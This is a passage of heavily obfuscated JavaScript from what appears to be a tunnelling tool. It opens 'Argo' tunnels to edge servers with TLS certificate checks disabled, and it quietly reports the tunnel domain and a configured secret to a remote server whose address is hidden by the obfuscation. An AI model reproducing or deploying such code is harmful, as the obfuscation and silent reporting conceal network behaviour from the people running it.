    const eg = a0aX, g = {
            'DwotD': function (h, i) {
                return h(i);
            },
            'SPjHj': eg(0x509),
            'shzlw': eg(0x661),
            'sMnTJ': eg(0x7a3),
            'LLvXj': function (h, i) {
                return h(i);
            },
            'mvYdf': function (h, i) {
                return h === i;
            },
            'UvRPs': function (h, i) {
                return h === i;
            },
            'udgvP': eg(0x65e),
            'JiogG': eg(0x180),
            'bloVo': function (h, i) {
                return h === i;
            },
            'ZqyBB': eg(0x4cd),
            'UYsHl': eg(0x773),
            'Njhwi': function (h, i) {
                return h(i);
            },
            'NkntA': eg(0x2ca)
        };
    return new Promise((h, i) => {
        const eh = eg;
        let j;
        try {
            j = new URL(a);
        } catch (q) {
            i(new Error(g[eh(0x862)]));
            return;
        }
        if (![
                g[eh(0x123)],
                g[eh(0x2f6)]
            ]['includes'](j[eh(0x112)]) || !j[eh(0x53c)]) {
            g['LLvXj'](i, new Error(g['SPjHj']));
            return;
        }
        const k = g[eh(0x846)](j['protocol'], 'https:'), l = j[eh(0x458)] || (k ? 0x1bb : 0x50), m = {};
        for (const [r, s] of d) {
            const t = r['toLowerCase']();
            if (g['UvRPs'](t, g[eh(0x818)]) || g[eh(0x846)](t, g[eh(0x645)]) || g['bloVo'](t, g[eh(0x876)]) || t === eh(0x6e6))
                continue;
            m[r] = s;
        }
        m[eh(0x17b)] = j['host'];
        f[eh(0x38d)] && (m[g[eh(0x2ab)]] = g[eh(0x532)](String, f['length']));
        const n = c[eh(0x1f5)]('/') ? c : '/' + c, o = k ? a0h : a0g, p = o[eh(0x2c5)]({
                'hostname': j['hostname'],
                'port': l,
                'path': n,
                'method': b,
                'headers': m,
                'timeout': 0x7530
            }, u => {
                const ei = eh;
                g[ei(0x1cb)](h, {
                    'status': u[ei(0x608)],
                    'headers': a0aB(u),
                    'body': u
                });
            });
        p['on'](g[eh(0x7d2)], u => i(u)), p[eh(0x712)](f[eh(0x38d)] ? f : undefined);
    });
}
function a0aD(a) {
    const ej = a0aX, b = {
            'evsHh': ej(0x712),
            'fexyQ': ej(0x5a2),
            'uUqtH': function (c) {
                return c();
            },
            'LYZuB': function (c, d) {
                return c(d);
            },
            'njBwp': ej(0x7c2),
            'Zevbt': ej(0x794),
            'IJCZL': function (c, d) {
                return c < d;
            },
            'sGzoy': function (c, d, f) {
                return c(d, f);
            },
            'pTZZl': function (c, d) {
                return c < d;
            },
            'wSdNW': function (c, d) {
                return c > d;
            },
            'wJCYu': function (c, d) {
                return c(d);
            },
            'AfIeA': function (c, d) {
                return c + d;
            },
            'mCWRA': ej(0x138),
            'Bbxfl': ej(0x2ca)
        };
    return new Promise((c, d) => {
        const ek = ej, f = {
                'soeXQ': b[ek(0x2ee)],
                'wSfDe': function (l, m) {
                    const el = ek;
                    return b[el(0x56a)](l, m);
                },
                'eonIk': function (l) {
                    const em = ek;
                    return b[em(0x638)](l);
                },
                'wGJqE': 'latin1',
                'BwZzg': function (l, m, n) {
                    const en = ek;
                    return b[en(0x12d)](l, m, n);
                },
                'cbrTW': function (l, m) {
                    const eo = ek;
                    return b[eo(0x527)](l, m);
                },
                'BjDfx': ek(0x12e),
                'uamrj': function (l, m) {
                    const ep = ek;
                    return b[ep(0x17e)](l, m);
                },
                'XVlVf': function (l, m) {
                    const eq = ek;
                    return b[eq(0x370)](l, m);
                },
                'vtORJ': function (l, m) {
                    const er = ek;
                    return b[er(0x151)](l, m);
                },
                'tsIvD': function (l, m) {
                    const es = ek;
                    return b[es(0x178)](l, m);
                }
            };
        let g = Buffer['alloc'](0x0);
        const h = () => {
                const et = ek;
                a[et(0x690)]('data', i), a['removeListener'](et(0x2ca), j), a['removeListener'](b['evsHh'], k), a[et(0x690)](b[et(0x268)], k);
            }, i = l => {
                const eu = ek;
                g = g[eu(0x38d)] ? Buffer[eu(0x83f)]([
                    g,
                    l
                ]) : l;
                const m = g[eu(0x51a)](f[eu(0x461)]);
                if (f[eu(0x2c9)](m, 0x0))
                    return;
                f[eu(0x615)](h);
                const n = g[eu(0x6aa)](0x0, m)[eu(0x562)](f[eu(0x540)]), o = n['split']('\x0d\x0a'), p = o[0x0]['split']('\x20'), q = f[eu(0x57d)](parseInt, p[0x1], 0xa);
                if (!Number[eu(0x6ed)](q)) {
                    f['cbrTW'](d, new Error(f['BjDfx']));
                    return;
                }
                const r = [];
                for (let s = 0x1; f[eu(0x595)](s, o['length']); s++) {
                    const t = o[s];
                    if (!t)
                        continue;
                    const u = t[eu(0x51a)](':');
                    f[eu(0x1b1)](u, 0x0) && r[eu(0x4a7)]([
                        t[eu(0x6fd)](0x0, u)[eu(0x1c8)](),
                        t[eu(0x6fd)](u + 0x1)['trim']()
                    ]);
                }
                f[eu(0x368)](c, {
                    'status': q,
                    'headers': r,
                    'rest': g[eu(0x6aa)](f['tsIvD'](m, 0x4))
                });
            }, j = l => {
                const ev = ek;
                h(), f[ev(0x368)](d, l);
            }, k = () => {
                const ew = ek;
                b['uUqtH'](h), b[ew(0x527)](d, new Error(b[ew(0x873)]));
            };
        a['on'](b[ek(0x3db)], i), a['on'](b[ek(0x388)], j), a['on'](ek(0x712), k), a['on'](b[ek(0x268)], k);
    });
}
function a0aE(a) {
    const ex = a0aX, b = {
            'CFtZS': ex(0x2f9),
            'Jtfzs': function (f, g) {
                return f === g;
            },
            'uBNok': ex(0x7d0),
            'KcitL': function (f, g) {
                return f === g;
            },
            'PVlzT': 'cftunnel.com',
            'qAkeG': ex(0x1b7),
            'euHJx': function (f, g) {
                return f !== g;
            },
            'KulnR': ex(0x529),
            'DzsqU': ex(0x7f6),
            'EpxgL': function (f, g) {
                return f(g);
            },
            'DuvFD': ex(0x1b0),
            'DVvLd': function (f, g) {
                return f + g;
            },
            'NxRkT': ex(0x72a),
            'cVcuZ': ex(0x318)
        };
    if (!a || !a[ex(0x2c0)])
        return b[ex(0x13b)];
    if (b['euHJx'](a[ex(0x2c0)]['O'], b[ex(0x294)]))
        return b[ex(0x677)] + (a[ex(0x2c0)]['O'] || '');
    if (!b[ex(0x788)](String, a[ex(0x2c0)]['OU'] || '')[ex(0x1f5)](b['DuvFD']))
        return b[ex(0x460)](ex(0x7c5), a['issuer']['OU'] || '');
    if (!a[ex(0x702)] || a[ex(0x702)]['CN'] !== b['NxRkT'])
        return b[ex(0x6f6)];
    const c = b['EpxgL'](String, a['subjectaltname'] || '')[ex(0x622)](',')[ex(0x747)](f => f[ex(0x1c8)]()[ex(0x118)]()), d = c[ex(0x539)](f => {
            const ey = ex;
            if (!f[ey(0x1f5)](b[ey(0x7fe)]))
                return ![];
            const g = f[ey(0x6fd)](0x4);
            return b[ey(0x824)](g, b[ey(0x427)]) || b[ey(0x413)](g, b[ey(0x2e8)]) || g[ey(0x1f5)]('*.') && b[ey(0x427)][ey(0x3e1)](g['slice'](0x1));
        });
    if (!d)
        return ex(0x5b0);
    return null;
}
function a0aF(a, b) {
    const ez = a0aX, c = {
            'PiWTa': ez(0x87f),
            'WbYfm': function (h, i) {
                return h + i;
            },
            'cEijz': ez(0x58d),
            'MoWgc': ez(0x2ca),
            'OPXiv': function (h, i) {
                return h + i;
            },
            'yZyLE': ez(0x343),
            'txvUH': ez(0x49f),
            'ViagT': function (h, i) {
                return h + i;
            },
            'uGcgW': ez(0x437)
        }, d = a0a2[ez(0x6fd)]()[ez(0x868)](() => Math[ez(0x2a3)]() - 0.5);
    let f = null;
    const g = async () => {
        const eA = ez, h = {
                'Teuxq': c[eA(0x4b4)],
                'TbUpG': function (i, j) {
                    return i !== j;
                },
                'tWOkx': function (i, j) {
                    return c['WbYfm'](i, j);
                },
                'QuuXC': c[eA(0x334)],
                'fTVHl': function (i, j) {
                    return i(j);
                },
                'bzqEq': c[eA(0x5c6)]
            };
        for (const i of d) {
            try {
                return await new Promise((j, k) => {
                    const eB = eA, l = a0j['connect']({
                            'host': i,
                            'port': a0a3,
                            'ALPNProtocols': ['h2'],
                            'servername': eB(0x7d0),
                            'rejectUnauthorized': ![]
                        });
                    l[eB(0x70c)](0x2710, () => l[eB(0x56e)](new Error(eB(0x7d6)))), l['on'](h[eB(0x4ab)], k), l['on'](eB(0x25f), () => {
                        const eC = eB;
                        if (a) {
                            const n = a0aE(l[eC(0x29d)](![]));
                            if (n) {
                                l[eC(0x56e)](new Error(h[eC(0x5d4)] + n));
                                return;
                            }
                        }
                        const m = l[eC(0x489)];
                        if (m && h[eC(0x55d)](m, 'h2')) {
                            l[eC(0x56e)](new Error('edge\x20did\x20not\x20negotiate\x20h2'));
                            return;
                        }
                        a0aK > 0x0 ? l[eC(0x70c)](a0aK, () => l['destroy'](new Error('edge\x20connection\x20idle\x20timeout'))) : l[eC(0x70c)](0x0), b[eC(0x604)](h[eC(0x624)](h['QuuXC'] + i + ':', a0a3)), h[eC(0x2b1)](j, l);
                    });
                });
            } catch (j) {
                f = j, b['warning'](c['WbYfm'](c[eA(0x659)](c[eA(0x228)](c[eA(0x1e4)], i), c[eA(0x20d)]), j));
            }
        }
        throw new Error(c[eA(0x4e1)](c[eA(0x25c)], f));
    };
    return g();
}
const a0aG = 0x2;
function a0aH(a, b, c) {
    const eD = a0aX, d = {
            'sDJBq': function (g, h, i) {
                return g(h, i);
            },
            'jMamG': function (g, h) {
                return g < h;
            }
        }, f = d[eD(0x4a6)](parseInt, process.env[a] || '', 0xa);
    if (!Number['isInteger'](f) || d['jMamG'](f, c))
        return b;
    return f;
}
const a0aI = a0aH('KISAMA_ARGO_REREGISTER_AFTER', 0x5, 0x2), a0aJ = 0x1e, a0aK = ((() => {
        const eE = a0aX, a = {
                'BUwJT': function (c, d, f) {
                    return c(d, f);
                },
                'CYPwp': function (c, d) {
                    return c < d;
                },
                'AetAs': function (c, d) {
                    return c * d;
                },
                'POMDK': function (c, d) {
                    return c === d;
                },
                'mCYek': function (c, d) {
                    return c * d;
                }
            }, b = a[eE(0x78b)](parseInt, process.env.KISAMA_ARGO_IDLE_TIMEOUT || '', 0xa);
        if (!Number[eE(0x6ed)](b) || a[eE(0x2c4)](b, 0x0))
            return a[eE(0x41f)](0x12c, 0x3e8);
        return a[eE(0x710)](b, 0x0) ? 0x0 : a[eE(0x83b)](Math[eE(0x12c)](b, 0xa), 0x3e8);
    })());
function a0aL(a) {
    const eF = a0aX, b = {
            'eiWsX': function (c, d) {
                return c === d;
            },
            'hcEEg': 'object'
        };
    if (typeof a === eF(0x628)) {
        const c = a[eF(0x1c8)]();
        if (c)
            try {
                return JSON[eF(0x1ef)](c);
            } catch (d) {
            }
        return {};
    }
    return a && b[eF(0x691)](typeof a, b[eF(0x889)]) ? a : {};
}
class a0aM {
    constructor(a) {
        const eG = a0aX;
        this[eG(0x451)] = a, this[eG(0x45b)] = new Map(), this[eG(0x5f4)] = null;
    }
    async [a0aX(0x2e9)](a, b) {
        const eH = a0aX, c = {
                'wvxym': function (l, m) {
                    return l > m;
                },
                'rJjmE': function (l, m) {
                    return l(m);
                },
                'FXaQM': eH(0x6b5),
                'irNmP': function (l, m) {
                    return l + m;
                },
                'JUfol': eH(0x813),
                'rRdAe': eH(0x798),
                'mEjll': function (l, m) {
                    return l + m;
                },
                'vHIzB': function (l, m) {
                    return l + m;
                },
                'SIYQN': 'argo\x20tunnel\x20created:\x20',
                'nWass': eH(0x273)
            }, d = this[eH(0x45b)][eH(0x858)](a) || [];
        if (c[eH(0x57a)](d[eH(0x38d)], 0x0) && !b) {
            const l = new Error(eH(0x4ec) + a + eH(0x2d4));
            l[eH(0x126)] = 0x199, l[eH(0x458)] = a;
            throw l;
        }
        let f, g, h, i;
        try {
            [f, g, h, i] = await c['rJjmE'](a0au, c['FXaQM']);
        } catch (m) {
            const n = new Error(c[eH(0x893)](c[eH(0x62b)], m[eH(0x56d)]));
            n[eH(0x126)] = 0x1f4, n[eH(0x458)] = a;
            throw n;
        }
        const j = f[eH(0x1f5)](c[eH(0x115)]) ? f : c[eH(0x564)](c[eH(0x115)], f), k = {
                'tunnelDomain': j,
                'port': a,
                'createdAt': new Date()['toISOString']()[eH(0x884)](/\.\d{3}Z$/, 'Z'),
                'stopped': ![],
                'sock': null,
                'runPromise': null
            };
        return k[eH(0x6b3)] = this['_runLoop'](k, g, h, i)[eH(0x237)](o => this[eH(0x451)][eH(0x34a)](eH(0x144) + j + eH(0x5ce) + o[eH(0x56d)])), d[eH(0x4a7)](k), this['tunnels']['set'](a, d), this[eH(0x451)][eH(0x604)](c[eH(0x711)](c[eH(0x46c)], j) + c[eH(0x450)] + a), k;
    }
    [a0aX(0x270)]() {
        const eI = a0aX, a = [], b = [...this[eI(0x45b)][eI(0x524)]()][eI(0x868)]((c, d) => c - d);
        for (const c of b) {
            for (const d of this['tunnels']['get'](c)) {
                a[eI(0x4a7)]({
                    'tunnel_domain': d['tunnelDomain'],
                    'port': d[eI(0x458)],
                    'created_at': d[eI(0x39a)]
                });
            }
        }
        return a;
    }
    async [a0aX(0x23c)](a, b) {
        const eJ = a0aX, c = {
                'LIUUz': function (i, j) {
                    return i === j;
                },
                'xOSdZ': function (i, j) {
                    return i === j;
                },
                'cTTKt': function (i, j) {
                    return i > j;
                },
                'JvMeg': function (i, j) {
                    return i + j;
                },
                'qKzdH': eJ(0x5dd)
            }, d = this['tunnels']['get'](a) || [];
        if (c[eJ(0x81c)](d[eJ(0x38d)], 0x0))
            return {
                'status': 0x194,
                'message': eJ(0x34f) + a
            };
        let f;
        if (c[eJ(0x81c)](b, undefined) || c[eJ(0x822)](b, null) || c[eJ(0x822)](b, '')) {
            if (c[eJ(0x290)](d[eJ(0x38d)], 0x1))
                return {
                    'status': 0x199,
                    'message': eJ(0x261) + a + ',\x20specify\x20tunnel_domain\x20to\x20disambiguate'
                };
            f = d;
        } else {
            f = d[eJ(0x597)](i => i[eJ(0x4ae)] === b);
            if (c[eJ(0x81c)](f[eJ(0x38d)], 0x0))
                return {
                    'status': 0x194,
                    'message': eJ(0x34f) + a + eJ(0x7e4) + b
                };
        }
        const g = [];
        for (const i of f) {
            i[eJ(0x75c)] = !![];
            if (i[eJ(0x463)] !== null)
                try {
                    i[eJ(0x463)][eJ(0x56e)]();
                } catch (j) {
                }
            await i['runPromise'][eJ(0x237)](() => {
            }), g[eJ(0x4a7)]({
                'tunnel_domain': i[eJ(0x4ae)],
                'port': i['port'],
                'created_at': i[eJ(0x39a)]
            });
        }
        const h = d['filter'](k => !k['stopped']);
        c[eJ(0x290)](h['length'], 0x0) ? this[eJ(0x45b)]['set'](a, h) : this[eJ(0x45b)]['delete'](a);
        for (const k of g) {
            this[eJ(0x451)][eJ(0x604)](c['JvMeg'](c[eJ(0x394)], k[eJ(0x556)]));
        }
        return {
            'status': 'ok',
            'deleted': g['length'],
            'tunnels': g
        };
    }
    async [a0aX(0x739)](a, b, c, d) {
        const eK = a0aX, f = {
                'lQIEn': function (k, l) {
                    return k < l;
                },
                'LSINA': function (k, l) {
                    return k + l;
                },
                'JTTAd': eK(0x674),
                'lWZjt': function (k, l) {
                    return k !== l;
                },
                'MfDDC': function (k, l) {
                    return k(l);
                },
                'rFsut': eK(0x365),
                'UuhHx': function (k, l, m) {
                    return k(l, m);
                },
                'gSvuE': function (k, l) {
                    return k % l;
                },
                'ZbWVk': function (k, l) {
                    return k + l;
                },
                'Rhfws': 'argo\x20tunnel\x20',
                'oZjhU': eK(0x13d),
                'LRZnF': function (k, l) {
                    return k !== l;
                },
                'OYsMq': function (k, l) {
                    return k >= l;
                },
                'eIYhk': function (k, l) {
                    return k * l;
                }
            }, g = f[eK(0x157)](f[eK(0x21f)], a['port']), h = async k => {
                const eL = eK;
                for (let l = 0x0; f[eL(0x626)](l, k) && !a['stopped']; l += 0x1f4) {
                    await new Promise(m => setTimeout(m, Math[eL(0x71e)](0x1f4, k - l)));
                }
            };
        let i = 0x0, j = 0x0;
        while (!a[eK(0x75c)]) {
            let k = null, l = null;
            try {
                const m = f[eK(0x751)](f[eK(0x4ca)](String, process.env.KISAMA_EDGE_INSECURE || '')[eK(0x118)](), f['rFsut']);
                k = await f[eK(0x380)](a0aF, m, this[eK(0x451)]);
                if (a[eK(0x75c)]) {
                    try {
                        k['destroy']();
                    } catch (n) {
                    }
                    break;
                }
                a[eK(0x463)] = k, j = f['gSvuE'](f[eK(0x157)](j, 0x1), 0x4), l = new a0ax(k, g, b, c, d, j, this[eK(0x451)], a[eK(0x4ae)], ![], { 'printed': !![] }), await l[eK(0x7cf)]();
            } catch (o) {
                !a[eK(0x75c)] && this[eK(0x451)][eK(0x34a)](f['ZbWVk'](f[eK(0x157)](f[eK(0x157)](f[eK(0x145)], a['tunnelDomain']), f[eK(0x52a)]), o[eK(0x56d)]));
            } finally {
                if (f[eK(0x1e2)](k, null))
                    try {
                        k['destroy']();
                    } catch (p) {
                    }
                a[eK(0x463)] = null;
            }
            if (a[eK(0x75c)])
                break;
            l !== null && l[eK(0x418)] ? i = 0x0 : (i += 0x1, f[eK(0x89f)](i, a0aI) && (await this[eK(0x6b9)](a, (q, r, s) => {
                b = q, c = r, d = s;
            }) ? i = 0x0 : await f[eK(0x4ca)](h, f[eK(0x1c7)](a0aJ, 0x3e8)))), !a['stopped'] && await h(a0aG * 0x3e8);
        }
    }
    [a0aX(0x6b9)](a, b) {
        const eM = a0aX, c = {
                'FRowE': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'ppMxd': 'https://',
                'dYyYe': function (f, g) {
                    return f + g;
                },
                'GBRow': function (f, g) {
                    return f + g;
                },
                'BWIPt': function (f, g) {
                    return f + g;
                },
                'wHINV': eM(0x671),
                'bUjTx': function (f, g) {
                    return f === g;
                },
                'JAcpf': eM(0x468),
                'DnKII': eM(0x644),
                'IJrPK': function (f, g) {
                    return f(g);
                },
                'GOGfG': eM(0x6b5)
            }, d = this[eM(0x610)] || a0au;
        return c['IJrPK'](d, c[eM(0x136)])[eM(0x172)](([f, g, h, i]) => {
            const eN = eM, j = a[eN(0x4ae)];
            c['FRowE'](b, g, h, i), a[eN(0x4ae)] = f['startsWith'](c[eN(0x170)]) ? f : c[eN(0x209)](c[eN(0x170)], f), this[eN(0x451)][eN(0x34a)](c[eN(0x440)](c[eN(0x614)](c[eN(0x764)], j) + '\x20->\x20', a[eN(0x4ae)]));
            if (c[eN(0x199)](typeof this[eN(0x5f4)], c[eN(0x4b2)]))
                try {
                    this[eN(0x5f4)](j, a[eN(0x4ae)]);
                } catch (k) {
                }
            return !![];
        })['catch'](f => {
            const eO = eM;
            return this[eO(0x451)][eO(0x34a)](c[eO(0x614)](c[eO(0x1fc)], f[eO(0x56d)])), ![];
        });
    }
}
class a0aN {
    static ['_baseinfoHooked'] = ![];
    static [a0aX(0x623)] = null;
    static [a0aX(0x1bd)] = /^[A-Za-z0-9+_\-*$=@,;[/\]]+$/;
    static [a0aX(0x1b8)] = ![];
    static [a0aX(0x825)]() {
        const eP = a0aX, a = {
                'uKOEs': eP(0x6bd),
                'groZJ': function (g, h) {
                    return g < h;
                },
                'BZKEN': eP(0x435),
                'NwoOj': function (g, h) {
                    return g || h;
                },
                'uzHrH': eP(0x729),
                'DVjOL': '(未设置,\x20缺省复用\x20KNAME)',
                'HAYyW': eP(0x69c)
            }, b = a0P['KNAME'] || '', c = a0P[eP(0x435)] || a0P[eP(0x6eb)] || '', d = [];
        if (b[eP(0x38d)] < 0x3)
            d[eP(0x4a7)]('KNAME\x20过短\x20(' + b['length'] + eP(0x523));
        if (!this[eP(0x1bd)][eP(0x328)](b))
            d['push'](a[eP(0x19d)]);
        if (a[eP(0x236)](c[eP(0x38d)], 0x8))
            d[eP(0x4a7)](eP(0x430) + c['length'] + eP(0x5ae) + (a0P[eP(0x435)] ? a['BZKEN'] : 'KNAME') + ')');
        const f = d['length'] === 0x0;
        return !f && !this[eP(0x1b8)] && (this[eP(0x1b8)] = !![], a0D[eP(0x604)](eP(0x625) + d[eP(0x344)](';\x20') + '\x20(KNAME=' + a['NwoOj'](b, a[eP(0x898)]) + eP(0x42f) + (a0P[eP(0x435)] || a[eP(0x7d3)]) + ')'), a0D[eP(0x604)](a[eP(0x7b8)])), f;
    }
    static ['reportShzalDebug']() {
        const eQ = a0aX, a = {
                'GuxDQ': function (b, c) {
                    return b(c);
                },
                'lpwOh': 'true'
            };
        return a0P[eQ(0x4eb)] || a[eQ(0x7e3)](String, process.env.SHZAL_DEBUG || '')['toLowerCase']() === a['lpwOh'];
    }
    static [a0aX(0x6bf)](a) {
        const eR = a0aX, b = {
                'UbrAN': function (f, g) {
                    return f + g;
                },
                'zonIm': eR(0x6af),
                'KUjzb': function (f, g) {
                    return f(g);
                },
                'dVKwP': eR(0x41d),
                'uPySn': function (f, g) {
                    return f === g;
                },
                'gPzpH': eR(0x5ea),
                'DaLAO': function (f, g, h, i, j) {
                    return f(g, h, i, j);
                },
                'pLGAv': 'PUT',
                'IgTIu': function (f, g) {
                    return f === g;
                },
                'KCMfS': eR(0x4b9),
                'nHNZD': function (f, g) {
                    return f + g;
                },
                'qCYbJ': function (f, g) {
                    return f + g;
                },
                'oEbfO': eR(0x2ca),
                'fcuHU': function (f, g) {
                    return f + g;
                },
                'uKDsl': eR(0x61d),
                'mzjgh': function (f, g) {
                    return f === g;
                },
                'ROSch': eR(0x7a1),
                'zKfks': function (f, g) {
                    return f === g;
                },
                'AudWN': function (f, g) {
                    return f + g;
                },
                'hIifn': eR(0x49a),
                'ikSFg': function (f, g) {
                    return f(g);
                },
                'UjmvJ': function (f, g) {
                    return f + g;
                },
                'gEWlK': function (f, g) {
                    return f + g;
                },
                'RofJT': eR(0x63c),
                'JcuCK': eR(0x432),
                'opIDt': function (f, g, h, i, j) {
                    return f(g, h, i, j);
                },
                'OhxTF': 'POST',
                'IbUrV': function (f, g) {
                    return f + g;
                },
                'CDujE': '上报异常:\x20',
                'pXeIL': function (f, g) {
                    return f(g);
                }
            }, c = this[eR(0x60b)](), d = f => {
                const eS = eR;
                if (c)
                    a0D[eS(0x4b3)](b[eS(0x733)](b[eS(0x58a)], f));
            };
        return new Promise(f => {
            const eT = eR, g = {
                    'QkisR': eT(0x712),
                    'PvrDY': function (n, o) {
                        const eU = eT;
                        return b[eU(0x29f)](n, o);
                    },
                    'mzKDP': b[eT(0x5d2)],
                    'gfoBD': function (n, o) {
                        return b['KUjzb'](n, o);
                    },
                    'KsCsc': function (n, o) {
                        const eV = eT;
                        return b[eV(0x733)](n, o);
                    },
                    'YtuDJ': function (n, o) {
                        const eW = eT;
                        return b[eW(0x718)](n, o);
                    },
                    'LzvWK': b[eT(0x683)],
                    'UrGbv': function (n, o) {
                        const eX = eT;
                        return b[eX(0x82a)](n, o);
                    },
                    'oPISw': b[eT(0x278)],
                    'FWcXM': function (n, o) {
                        const eY = eT;
                        return b[eY(0x584)](n, o);
                    },
                    'FYzbR': function (n, o) {
                        const eZ = eT;
                        return b[eZ(0x44a)](n, o);
                    }
                }, h = a0P['KNAME'], i = a0P[eT(0x435)] || a0P[eT(0x6eb)], j = b[eT(0x39e)](eT(0x28c), a0k['randomBytes'](0xc)['toString'](b[eT(0x681)])), k = [
                    [
                        'c',
                        a
                    ],
                    [
                        'n',
                        h
                    ],
                    [
                        's',
                        i
                    ],
                    [
                        'e',
                        '7d'
                    ]
                ], l = n => {
                    const f0 = eT, o = n[f0(0x747)](([p, q]) => Buffer[f0(0x3a5)]('--' + j + f0(0x247) + p + f0(0x48d) + q + '\x0d\x0a'));
                    return o[f0(0x4a7)](Buffer[f0(0x3a5)]('--' + j + f0(0x7f1))), Buffer[f0(0x83f)](o);
                }, m = (n, o, p, q) => {
                    const f1 = eT, r = {
                            'MSRiZ': g[f1(0x174)],
                            'VkPpz': function (v, w) {
                                return g['PvrDY'](v, w);
                            },
                            'dUtqg': function (v, w) {
                                const f2 = f1;
                                return g[f2(0x790)](v, w);
                            }
                        }, s = new URL(n), t = a0h[f1(0x2c5)]({
                            'hostname': s['hostname'],
                            'port': s[f1(0x458)] || 0x1bb,
                            'path': s[f1(0x356)] + s[f1(0x2e4)],
                            'method': p,
                            'headers': {
                                'Content-Type': f1(0x47e) + j,
                                'Content-Length': o ? o[f1(0x38d)] : 0x0,
                                'User-Agent': f1(0x2ac)
                            }
                        }, v => {
                            const f3 = f1;
                            v['resume'](), v['on'](r['MSRiZ'], () => q(v[f3(0x608)]));
                        });
                    t['on'](g[f1(0x359)], v => {
                        const f4 = f1;
                        d(r[f4(0x33a)](r[f4(0x70e)](p, '\x20') + n, '\x20请求异常:\x20') + v[f4(0x56d)]), q(0x0);
                    }), t[f1(0x70c)](0x7530, () => t[f1(0x56e)](new Error(f1(0x6c1))));
                    if (o)
                        t[f1(0x462)](o);
                    t['end']();
                };
            b[eT(0x6da)](d, b[eT(0x1d3)](b['gEWlK'](b['gEWlK'](b[eT(0x88b)], h) + b[eT(0x63a)], i[eT(0x38d)] > 0x0), ')'));
            try {
                b['opIDt'](m, eT(0x833), l(k), b[eT(0x2bd)], n => {
                    const f5 = eT;
                    b['KUjzb'](d, b[f5(0x733)](b[f5(0x22b)], n));
                    if (b[f5(0x2e2)](n, 0x199)) {
                        b[f5(0x584)](d, b[f5(0x733)](b['UbrAN'](b['gPzpH'], h), ':*'));
                        const o = k[f5(0x597)](([p]) => p !== 'n');
                        b[f5(0x3e8)](m, f5(0x2b4) + h + ':' + i, l(o), b[f5(0x776)], p => {
                            const f6 = f5;
                            g[f6(0x770)](d, g['KsCsc'](g[f6(0x81b)](g['LzvWK'], p), g[f6(0x33c)](p, 0xc8) ? f6(0x82c) : g['oPISw'])), g['FWcXM'](f, g[f6(0x1c9)](p, 0xc8));
                        });
                    } else
                        b[f5(0x262)](n, 0xc8) ? (d(b[f5(0x1f1)]), f(!![])) : (d(b[f5(0x502)]('上报失败\x20(状态\x20', n) + ')'), f(![]));
                });
            } catch (n) {
                b[eT(0x584)](d, b[eT(0x2da)](b[eT(0x32c)], n[eT(0x56d)])), b[eT(0x2d9)](f, ![]);
            }
        })[eR(0x172)](f => {
            const f7 = eR;
            if (f)
                this[f7(0x623)] = a;
            return f;
        })[eR(0x237)](() => ![]);
    }
    static async [a0aX(0x2e6)](a) {
        const f8 = a0aX, b = {
                'LSHcP': function (c, d) {
                    return c <= d;
                },
                'HhtXA': function (c, d) {
                    return c < d;
                }
            };
        for (let c = 0x1; b[f8(0x4f9)](c, 0x3); c++) {
            if (await this[f8(0x6bf)](a))
                return;
            b['HhtXA'](c, 0x3) && await new Promise(d => setTimeout(d, 0x3e8 * 0x2 ** c));
        }
    }
    static ['homeDir']() {
        const f9 = a0aX, a = [
                process.env.USERPROFILE,
                process.env.HOME
            ];
        for (const b of a) {
            if (b && a0l[f9(0x83e)](b) && a0l[f9(0x195)](b)[f9(0x881)]())
                return b;
        }
        try {
            return a0p[f9(0x762)]();
        } catch (c) {
            return process[f9(0x60e)]();
        }
    }
    static [a0aX(0x27d)]() {
        const fa = a0aX, a = {
                'CIRBG': 'domain.txt',
                'ChILL': fa(0x183)
            };
        let b = (a0P[fa(0x342)] || '')[fa(0x1c8)]();
        if (!b)
            return a0o[fa(0x344)](this[fa(0x6c7)](), a[fa(0x544)]);
        if (b[fa(0x1f5)](a['ChILL']))
            b = b['length'] > 0x5 ? a0o['join'](this[fa(0x6c7)](), b[fa(0x6fd)](0x5)['replace'](/^[/\\]+/, '')) : this['homeDir']();
        else
            b['startsWith']('~') && (b = a0o[fa(0x409)](b[fa(0x884)](/^~(?=[/\\]|$)/, this[fa(0x6c7)]())));
        return b;
    }
    static [a0aX(0x4ce)](a) {
        const fb = a0aX;
        this[fb(0x623)] = a;
        const b = this[fb(0x27d)]();
        try {
            a0l[fb(0x568)](a0o['dirname'](a0o[fb(0x409)](b)), { 'recursive': !![] }), a0l['writeFileSync'](b, a), a0D[fb(0x604)](fb(0x42c) + b);
        } catch (c) {
            a0D['warn']('[KMODE]\x20⚠️\x20域名文件写入失败\x20(' + b + fb(0x147) + c[fb(0x56d)]);
        }
    }
    static [a0aX(0x1f6)]() {
        const fc = a0aX, a = this['resolveDomainFilePath']();
        try {
            a0l[fc(0x83e)](a) && a0l[fc(0x195)](a)[fc(0x2db)]() && (a0l[fc(0x7c1)](a), a0D['info']('[KMODE]\x20🗑️\x20域名文件已删除:\x20' + a));
        } catch (b) {
            a0D[fc(0x133)](fc(0x5e6) + a + fc(0x147) + b[fc(0x56d)]);
        }
    }
    static [a0aX(0x531)]() {
        const fd = a0aX;
        !this[fd(0x571)] && (this[fd(0x571)] = !![], this[fd(0x1f6)]());
    }
    static [a0aX(0x472)]() {
        const fe = a0aX, a = {
                'YNUZc': function (b, c) {
                    return b === c;
                },
                'inGcS': fe(0x50d),
                'rQyMx': fe(0x5d6),
                'pMCLD': fe(0x2fa),
                'SGRbv': 'close',
                'whhPV': fe(0x2ca)
            };
        try {
            const b = a0q[fe(0x2a6)]({
                'input': process[fe(0x2be)],
                'terminal': ![]
            });
            b['on'](a[fe(0x77e)], c => {
                const ff = fe;
                a['YNUZc'](c[ff(0x1c8)](), a['inGcS']) && console[ff(0x451)](this[ff(0x623)] || a[ff(0x3fd)]);
            }), b['on'](a[fe(0x58e)], () => {
            }), b['on'](a[fe(0x50e)], () => {
            });
        } catch (c) {
        }
    }
    static [a0aX(0x47f)](a) {
        const fg = a0aX, b = {
                'YYOmB': function (c, d) {
                    return c === d;
                },
                'AHjSO': fg(0x407),
                'tzrXa': fg(0x5a6)
            };
        if (b[fg(0x175)](a0P['KMODE'], '2') && this[fg(0x825)]()) {
            a0D[fg(0x604)](b[fg(0x2e3)]), a[fg(0x5f4)] = (c, d) => {
                this['reportDomainChange'](d);
            }, a['create'](a0P[fg(0x821)])[fg(0x172)](c => this[fg(0x6bf)](c['tunnelDomain']))['catch'](() => {
            });
            return;
        }
